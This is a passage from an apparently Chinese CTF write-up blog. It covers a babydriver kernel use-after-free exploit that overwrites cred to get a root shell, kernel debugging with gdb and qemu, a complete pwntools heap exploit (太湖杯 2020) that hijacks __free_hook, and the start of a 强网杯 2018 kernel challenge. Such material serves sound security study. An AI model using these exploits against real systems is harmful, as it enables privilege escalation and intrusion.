class="hljs-type">int</span> fd_2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR); <span class="hljs-comment">//babydev_struct.device_buf 记录的是 fd_2</span><br>        <span class="hljs-type">pid_t</span> pid;<br>        <span class="hljs-built_in">ioctl</span>(fd_1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>); <span class="hljs-comment">// 开辟0xa8的内核空间, 命名为chunk1吧</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">-1</span> == fd_1 || <span class="hljs-number">-1</span> == fd_2) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open babydev failed!\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-built_in">close</span>(fd_1);  <span class="hljs-comment">// 关闭fd_1, ioctl所开辟的0xa8空间, 释放掉chunk1内存,</span><br>        pid = fork(); <span class="hljs-comment">// fork 时有点类似与malloc中的fastbin原理, 子进程开辟cred内存的时候, 先遍历大小合适的空闲内存, 然后直接分配</span><br>        <span class="hljs-comment">// child process</span><br>        <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">char</span> buf[<span class="hljs-number">60</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>                <span class="hljs-built_in">write</span>(fd_2, buf, <span class="hljs-number">60</span>);  <span class="hljs-comment">//向释放掉的chunk1内存中填充60个0, 然而也是该进程的cred结构体,使uid和gid为0, 提权为root</span><br>                <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);     <span class="hljs-comment">//运行子进程时会继承父进程的权限</span><br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">wait</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>





<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="提取vmlinux"><a href="#提取vmlinux" class="headerlink" title="提取vmlinux"></a>提取vmlinux</h3><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0-only</span><br><span class="hljs-comment"># ----------------------------------------------------------------------</span><br><span class="hljs-comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Inspired from extract-ikconfig</span><br><span class="hljs-comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># ----------------------------------------------------------------------</span><br><br><span class="hljs-function"><span class="hljs-title">check_vmlinux</span></span>()<br>&#123;<br>	<span class="hljs-comment"># Use readelf to check if it&#x27;s a valid ELF</span><br>	<span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span><br>	<span class="hljs-comment">#       and not just an elf</span><br>	readelf -h <span class="hljs-variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="hljs-built_in">return</span> 1<br><br>	<span class="hljs-built_in">cat</span> <span class="hljs-variable">$1</span><br>	<span class="hljs-built_in">exit</span> 0<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">try_decompress</span></span>()<br>&#123;<br>	<span class="hljs-comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br>	<span class="hljs-comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br><br>	<span class="hljs-comment"># Try to find the header ($1) and decompress from here</span><br>	<span class="hljs-keyword">for</span>	pos <span class="hljs-keyword">in</span> `<span class="hljs-built_in">tr</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>\n<span class="hljs-variable">$2</span>&quot;</span> <span class="hljs-string">&quot;\n<span class="hljs-variable">$2</span>=&quot;</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$img</span>&quot;</span> | grep -abo <span class="hljs-string">&quot;^<span class="hljs-variable">$2</span>&quot;</span>`<br>	<span class="hljs-keyword">do</span><br>		pos=<span class="hljs-variable">$&#123;pos%%:*&#125;</span><br>		<span class="hljs-built_in">tail</span> -c+<span class="hljs-variable">$pos</span> <span class="hljs-string">&quot;<span class="hljs-variable">$img</span>&quot;</span> | <span class="hljs-variable">$3</span> &gt; <span class="hljs-variable">$tmp</span> 2&gt; /dev/null<br>		check_vmlinux <span class="hljs-variable">$tmp</span><br>	<span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-comment"># Check invocation:</span><br>me=<span class="hljs-variable">$&#123;0##*/&#125;</span><br>img=<span class="hljs-variable">$1</span><br><span class="hljs-keyword">if</span>	[ <span class="hljs-variable">$#</span> -ne 1 -o ! -s <span class="hljs-string">&quot;<span class="hljs-variable">$img</span>&quot;</span> ]<br><span class="hljs-keyword">then</span><br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2<br>	<span class="hljs-built_in">exit</span> 2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Prepare temp files:</span><br>tmp=$(<span class="hljs-built_in">mktemp</span> /tmp/vmlinux-XXX)<br><span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;rm -f <span class="hljs-variable">$tmp</span>&quot;</span> 0<br><br><span class="hljs-comment"># That didn&#x27;t work, so retry after decompression.</span><br>try_decompress <span class="hljs-string">&#x27;\037\213\010&#x27;</span> xy    gunzip<br>try_decompress <span class="hljs-string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz<br>try_decompress <span class="hljs-string">&#x27;BZh&#x27;</span>          xy    bunzip2<br>try_decompress <span class="hljs-string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma<br>try_decompress <span class="hljs-string">&#x27;\211\114\132&#x27;</span> xy    <span class="hljs-string">&#x27;lzop -d&#x27;</span><br>try_decompress <span class="hljs-string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="hljs-string">&#x27;lz4 -d&#x27;</span><br>try_decompress <span class="hljs-string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd<br><br><span class="hljs-comment"># Finally check for uncompressed images or objects:</span><br>check_vmlinux <span class="hljs-variable">$img</span><br><br><span class="hljs-comment"># Bail out:</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2<br></code></pre></td></tr></table></figure>

<p>保存为extract-vmlinux</p>
<p>提取vmlinux, 方便调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure>

<h3 id="启动gdb"><a href="#启动gdb" class="headerlink" title="启动gdb"></a>启动gdb</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb ./vmlinux -q<br></code></pre></td></tr></table></figure>

<h3 id="启动boot-sh获取babydriver的加载基址"><a href="#启动boot-sh获取babydriver的加载基址" class="headerlink" title="启动boot.sh获取babydriver的加载基址"></a>启动boot.sh获取babydriver的加载基址</h3><p>使用 cat &#x2F;proc&#x2F;moudles或者lsmod</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/ # lsmod<br>babydriver 16384 2 - Live 0xffffffffc0000000 (OE)<br></code></pre></td></tr></table></figure>



<h3 id="导入符号表"><a href="#导入符号表" class="headerlink" title="导入符号表"></a>导入符号表</h3><p>最后面填写babydriver的基址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">add-symbol-file ./fs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000<br></code></pre></td></tr></table></figure>



<h3 id="调试qumu"><a href="#调试qumu" class="headerlink" title="调试qumu"></a>调试qumu</h3><p>在boot.sh中添加参数如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-gdb tcp::9999<br></code></pre></td></tr></table></figure>

<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>运行程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./boot.sh<br></code></pre></td></tr></table></figure>

<p>在gdb中连接该qemu程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">target remote 127.0.0.1:9999<br></code></pre></td></tr></table></figure>

<p>运行如图</p>
<p><img src="/images/wp-babydriver-1.png"></p>
<p>先下个断点</p>
<p><img src="/images/wp-babydriver-2.png"></p>
<p>那么就和平时调试差不多了,只是调试相对比较慢而已, 下面就不演示了…</p>
<h1 id="太湖杯-2020"><a href="#太湖杯-2020" class="headerlink" title="太湖杯 2020"></a>太湖杯 2020</h1><h2 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li  = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.29&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;119.3.89.93&quot;</span><br>server_port = <span class="hljs-number">8014</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">i, sz, d</span>):<br>	sla(<span class="hljs-string">&#x27;ce:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">i, sz, d</span>):<br>	sla(<span class="hljs-string">&#x27;ce:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br>	<span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(d) &gt; <span class="hljs-number">0</span>):<br>		sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;ce:&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;ce:&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cre7</span>():<br>	sla(<span class="hljs-string">&#x27;ce:&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>(<span class="hljs-params">d</span>):<br>	sla(<span class="hljs-string">&#x27;ce:&#x27;</span>, <span class="hljs-string">&#x27;666&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>		ad(i, <span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x18</span>)<br><br>	rm(<span class="hljs-number">1</span>)<br>	md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>	dp(<span class="hljs-number">0</span>)<br><br>	ru(<span class="hljs-string">&#x27;:&#x27;</span>)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[-<span class="hljs-number">6</span>:] + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>	heap = leak - <span class="hljs-number">0x2a0</span><br>	li(<span class="hljs-string">&#x27;heap: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap))<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>		rm(i + <span class="hljs-number">2</span>)<br><br>	md(<span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>	md(<span class="hljs-number">7</span>, <span class="hljs-number">0x18</span>, p64(heap + <span class="hljs-number">0x250</span>))<br>	ad(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)<br>	ad(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)<br>	<br>	gift(<span class="hljs-string">&#x27;none&#x27;</span>)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	leak = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	offset = ( <span class="hljs-number">0x7f50cd676140</span> - <span class="hljs-number">0x7f50cd412000</span> ) <span class="hljs-comment"># remote</span><br>	<span class="hljs-comment">#offset = ( 0x7f6faf78a900 - 0x7f6faf53a000) # local</span><br>	libc_base = leak - offset<br>	free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>	ad(<span class="hljs-number">0</span>, <span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)<br>	ad(<span class="hljs-number">1</span>, <span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>	ad(<span class="hljs-number">2</span>, <span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)<br>	md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>	md(<span class="hljs-number">0</span>, <span class="hljs-number">0x58</span>, p64(free_hook))<br>	gift(<span class="hljs-string">&#x27;A&#x27;</span>)<br>	gift(p64(system))<br>	db()<br>	rm(<span class="hljs-number">1</span>)<br>	<span class="hljs-comment">#ad(5, 0x58, &#x27;A&#x27;)</span><br><br>	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br>	<br></code></pre></td></tr></table></figure>



<h1 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 core"></a>强网杯 2018 core</h1><p>一个kernel pwn，来入入手。</p>
<h3 id="如何解压cpio文件"><a href="#如何解压cpio文件" class="headerlink" title="如何解压cpio文件"></a>如何解压cpio文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo pacman -S ark<br></code></pre></td></tr></table></figure>

<p>直接使用ark解压软件解压即可。</p>
<h2 id="保护-7"><a href="#保护-7" class="headerlink" title="保护"></a>保护</h2><h3 id="start-script"><a href="#start-script" class="headerlink" title="start script"></a>start script</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">qemu-system-x86_64 \<br>-m 64M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s  \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure>

<p>开启了aslr保护</p>
<h3 id="driver"><a href="#driver" class="headerlink" title="driver"></a>driver</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     amd64-64-little<br>RELRO:    No RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x0)<br></code></pre></td></tr></table></figure>

<p>有cannary保护</p>
<h3 id="init-script"><a href="#init-script" class="headerlink" title="init script"></a>init script</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><span class="hljs-built_in">chmod</span> 666 /dev/ptmx<br><span class="hljs-built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>

<p>在上面init脚本中出现关机命令， 把它注释掉重新打包为cpio文件就不会自动关机了。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><h3 id="init-module函数"><a href="#init-module函数" class="headerlink" title="init_module函数"></a>init_module函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">init_module</span><span class="hljs-params">()</span><br>&#123;<br>  core_proc = proc_create(<span class="hljs-string">&quot;core&quot;</span>, <span class="hljs-number">438LL</span>, <span class="hljs-number">0LL</span>, &amp;core_fops);<br>  printk(&amp;unk_2DE);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



